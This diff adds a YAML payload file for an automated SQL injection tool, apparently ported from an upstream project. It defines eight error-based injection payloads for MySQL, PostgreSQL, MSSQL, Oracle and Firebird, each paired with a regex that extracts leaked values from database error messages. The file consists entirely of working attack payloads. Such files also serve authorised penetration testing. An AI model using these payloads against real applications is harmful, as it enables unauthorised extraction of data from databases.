@@ -1,0 +1,106 @@
+# Error-based payloads — ported from upstream xml/payloads/error_based.xml.
+# stype 2 = error-based.
+payloads:
+  - title: "MySQL >= 5.0 error-based - WHERE or HAVING clause (FLOOR)"
+    stype: 2
+    level: 1
+    risk: 1
+    clause: [1, 8, 9]
+    where: 1
+    vector: "AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT(([INFERENCE]),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLUMNS GROUP BY x)a)"
+    request:
+      payload: "AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT(([INFERENCE]),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLUMNS GROUP BY x)a)"
+    response:
+      grep: "DELIM[~]([^~]+)[~]"
+    dbms: ["mysql", "mariadb", "percona", "tidb"]
+
+  - title: "MySQL >= 5.1 error-based - Parameter (EXTRACTVALUE)"
+    stype: 2
+    level: 1
+    risk: 1
+    clause: [1, 8, 9]
+    where: 1
+    vector: "AND EXTRACTVALUE([RANDNUM], CONCAT(0x5c, ([INFERENCE])))"
+    request:
+      payload: "AND EXTRACTVALUE([RANDNUM], CONCAT(0x5c, ([INFERENCE])))"
+    response:
+      grep: "XPATH syntax error: '\\\\(.+)'"
+    dbms: ["mysql", "mariadb", "percona", "tidb"]
+
+  - title: "MySQL >= 5.1 error-based - Parameter (UPDATEXML)"
+    stype: 2
+    level: 2
+    risk: 1
+    clause: [1, 8, 9]
+    where: 1
+    vector: "AND UPDATEXML([RANDNUM],CONCAT(0x2e,([INFERENCE])),[RANDNUM])"
+    request:
+      payload: "AND UPDATEXML([RANDNUM],CONCAT(0x2e,([INFERENCE])),[RANDNUM])"
+    response:
+      grep: "XPATH syntax error: '\\.(.+)'"
+    dbms: ["mysql", "mariadb", "percona", "tidb"]
+
+  - title: "PostgreSQL error-based - Parameter (CAST)"
+    stype: 2
+    level: 1
+    risk: 1
+    clause: [1, 8, 9]
+    where: 1
+    vector: "AND CAST(([INFERENCE]) AS NUMERIC)"
+    request:
+      payload: "AND CAST(([INFERENCE]) AS NUMERIC)"
+    response:
+      grep: "invalid input syntax for type numeric: \"([^\"]+)\""
+    dbms: ["postgresql", "greenplum", "redshift", "cockroachdb", "yugabyte", "alloydb", "opengauss"]
+
+  - title: "MSSQL error-based - Parameter (CONVERT)"
+    stype: 2
+    level: 1
+    risk: 1
+    clause: [1, 8, 9]
+    where: 1
+    vector: "AND CONVERT(INT,([INFERENCE]))"
+    request:
+      payload: "AND CONVERT(INT,([INFERENCE]))"
+    response:
+      grep: "Conversion failed when converting the [\\w ]+ value '([^']+)' to data type int"
+    dbms: ["mssql"]
+
+  - title: "Oracle error-based - Parameter (CTXSYS.DRITHSX.SN)"
+    stype: 2
+    level: 2
+    risk: 1
+    clause: [1, 8, 9]
+    where: 1
+    vector: "AND CTXSYS.DRITHSX.SN(0,([INFERENCE]))"
+    request:
+      payload: "AND CTXSYS.DRITHSX.SN(0,([INFERENCE]))"
+    response:
+      grep: "DRG-(\\d+):.+: ([^\\n]+)"
+    dbms: ["oracle"]
+
+  - title: "Generic error-based - Parameter (GTID_SUBSET)"
+    stype: 2
+    level: 3
+    risk: 1
+    clause: [1, 8, 9]
+    where: 1
+    vector: "AND GTID_SUBSET(CONCAT(0x7e,([INFERENCE]),0x7e),[RANDNUM])"
+    request:
+      payload: "AND GTID_SUBSET(CONCAT(0x7e,([INFERENCE]),0x7e),[RANDNUM])"
+    response:
+      grep: "is not a valid GTID set: '~(.+)~'"
+    dbms: ["mysql", "mariadb", "percona", "tidb"]
+
+  - title: "Firebird error-based - Parameter"
+    stype: 2
+    level: 3
+    risk: 1
+    clause: [1, 8, 9]
+    where: 1
+    vector: "AND IIF(([INFERENCE])>0,1,CAST(4 AS SMALLINT))"
+    request:
+      payload: "AND IIF(([INFERENCE])>0,1,CAST(4 AS SMALLINT))"
+    response:
+      grep: "conversion error from string \"([^\"]+)\""
+    dbms: ["firebird"]
